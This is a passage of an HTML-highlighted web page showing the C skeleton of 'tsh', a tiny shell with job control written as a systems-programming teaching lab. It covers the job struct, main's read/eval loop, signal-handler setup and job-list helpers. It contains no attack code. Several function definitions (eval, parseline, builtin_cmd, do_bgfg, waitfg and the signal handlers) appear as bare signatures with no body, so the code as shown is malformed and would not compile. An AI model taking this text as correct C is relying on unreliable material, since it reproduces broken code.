class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tsh - A tiny shell program with job control</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * &lt;Put your name and login ID here&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-comment">/* Misc manifest constants */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXLINE 1024   <span class="hljs-comment">/* max line size */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXARGS 128    <span class="hljs-comment">/* max args on a command line */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJOBS 16     <span class="hljs-comment">/* max jobs at any point in time */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJID 1 &lt;&lt; 16 <span class="hljs-comment">/* max job ID */</span></span><br><br><span class="hljs-comment">/* Job states */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNDEF 0 <span class="hljs-comment">/* undefined */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FG 1    <span class="hljs-comment">/* running in foreground */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BG 2    <span class="hljs-comment">/* running in background */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ST 3    <span class="hljs-comment">/* stopped */</span></span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span><br><span class="hljs-comment"> * Job state transitions and enabling actions:</span><br><span class="hljs-comment"> *     FG -&gt; ST  : ctrl-z</span><br><span class="hljs-comment"> *     ST -&gt; FG  : fg command</span><br><span class="hljs-comment"> *     ST -&gt; BG  : bg command</span><br><span class="hljs-comment"> *     BG -&gt; FG  : fg command</span><br><span class="hljs-comment"> * At most 1 job can be in the FG state.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* Global variables */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;   <span class="hljs-comment">/* defined in libc */</span><br><span class="hljs-keyword">char</span> prompt[] = <span class="hljs-string">&quot;tsh&gt; &quot;</span>; <span class="hljs-comment">/* command line prompt (DO NOT CHANGE) */</span><br><span class="hljs-keyword">int</span> verbose = <span class="hljs-number">0</span>;         <span class="hljs-comment">/* if true, print additional output */</span><br><span class="hljs-keyword">int</span> nextjid = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* next job ID to allocate */</span><br><span class="hljs-keyword">char</span> sbuf[MAXLINE];      <span class="hljs-comment">/* for composing sprintf messages */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span></span><br><span class="hljs-class">&#123;</span>                          <span class="hljs-comment">/* The job struct */</span><br>    <span class="hljs-keyword">pid_t</span> pid;             <span class="hljs-comment">/* job PID */</span><br>    <span class="hljs-keyword">int</span> jid;               <span class="hljs-comment">/* job ID [1, 2, ...] */</span><br>    <span class="hljs-keyword">int</span> state;             <span class="hljs-comment">/* UNDEF, BG, FG, or ST */</span><br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE]; <span class="hljs-comment">/* command line */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> <span class="hljs-title">jobs</span>[<span class="hljs-title">MAXJOBS</span>];</span> <span class="hljs-comment">/* The job list */</span><br><span class="hljs-comment">/* End global variables */</span><br><br><span class="hljs-comment">/* Function prototypes */</span><br><br><span class="hljs-comment">/* Here are the functions that you will implement */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-comment">/* Here are helper routines that we&#x27;ve provided for you */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handler_t</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * main - The shell&#x27;s main routine </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE];<br>    <span class="hljs-keyword">int</span> emit_prompt = <span class="hljs-number">1</span>; <span class="hljs-comment">/* emit prompt (default) */</span><br><br>    <span class="hljs-comment">/* Redirect stderr to stdout (so that driver will get all output</span><br><span class="hljs-comment">     * on the pipe connected to stdout) */</span><br>    dup2(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">/* Parse the command line */</span><br>    <span class="hljs-keyword">while</span> ((c = getopt(argc, argv, <span class="hljs-string">&quot;hvp&quot;</span>)) != EOF)<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (c)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-comment">/* print help message */</span><br>            usage();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-comment">/* emit additional diagnostic info */</span><br>            verbose = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:            <span class="hljs-comment">/* don&#x27;t print a prompt */</span><br>            emit_prompt = <span class="hljs-number">0</span>; <span class="hljs-comment">/* handy for automatic testing */</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            usage();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* Install the signal handlers */</span><br><br>    <span class="hljs-comment">/* These are the ones you will need to implement */</span><br>    Signal(SIGINT, sigint_handler);   <span class="hljs-comment">/* ctrl-c */</span><br>    Signal(SIGTSTP, sigtstp_handler); <span class="hljs-comment">/* ctrl-z */</span><br>    Signal(SIGCHLD, sigchld_handler); <span class="hljs-comment">/* Terminated or stopped child */</span><br><br>    <span class="hljs-comment">/* This one provides a clean way to kill the shell */</span><br>    Signal(SIGQUIT, sigquit_handler);<br><br>    <span class="hljs-comment">/* Initialize the job list */</span><br>    initjobs(jobs);<br><br>    <span class="hljs-comment">/* Execute the shell&#x27;s read/eval loop */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br><br>        <span class="hljs-comment">/* Read command line */</span><br>        <span class="hljs-keyword">if</span> (emit_prompt)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, prompt);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="hljs-built_in">stdin</span>) == <span class="hljs-literal">NULL</span>) &amp;&amp; ferror(<span class="hljs-built_in">stdin</span>))<br>            app_error(<span class="hljs-string">&quot;fgets error&quot;</span>);<br>        <span class="hljs-keyword">if</span> (feof(<span class="hljs-built_in">stdin</span>))<br>        &#123; <span class="hljs-comment">/* End of file (ctrl-d) */</span><br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* Evaluate the command line */</span><br>        eval(cmdline);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* control never reaches here */</span><br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="hljs-comment"><span class="hljs-function"> * </span></span><br><span class="hljs-comment"><span class="hljs-function"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="hljs-comment"><span class="hljs-function"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="hljs-comment"><span class="hljs-function"> * the user has requested a FG job.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    it immediately.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*****************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * Signal handlers</span></span><br><span class="hljs-comment"><span class="hljs-function"> *****************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     currently running children to terminate.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    to the foreground job.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*</span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*********************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * End signal handlers</span></span><br><span class="hljs-comment"><span class="hljs-function"> *********************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/***********************************************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * Helper routines that manipulate the job list</span></span><br><span class="hljs-comment"><span class="hljs-function"> **********************************************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span><br><span class="hljs-function"></span>&#123;<br>    job-&gt;pid = <span class="hljs-number">0</span>;<br>    job-&gt;jid = <span class="hljs-number">0</span>;<br>    job-&gt;state = UNDEF;<br>    job-&gt;cmdline[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* initjobs - Initialize the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        clearjob(&amp;jobs[i]);<br>&#125;<br><br><span class="hljs-comment">/* maxjid - Returns largest allocated job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, max = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].jid &gt; max)<br>            max = jobs[i].jid;<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br><br><span class="hljs-comment">/* addjob - Add a job to the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == <span class="hljs-number">0</span>)<br>        &#123;<br>            jobs[i].pid = pid;<br>            jobs[i].state = state;<br>            jobs[i].jid = nextjid++;<br>            <span class="hljs-keyword">if</span> (nextjid &gt; MAXJOBS)<br>                nextjid = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">strcpy</span>(jobs[i].cmdline, cmdline);<br>            <span class="hljs-keyword">if</span> (verbose)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tried to create too many jobs\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* deletejob - Delete a job whose PID=pid from the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        &#123;<br>            clearjob(&amp;jobs[i]);<br>            nextjid = maxjid(jobs) + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].state == FG)<br>            <span class="hljs-keyword">return</span> jobs[i].pid;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobpid  - Find a job (by PID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>            <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobjid  - Find a job (by JID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (jid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].jid == jid)<br>            <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* pid2jid - Map process ID to job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        &#123;<br>            <span class="hljs-keyword">return</span> jobs[i].jid;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* listjobs - Print the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span 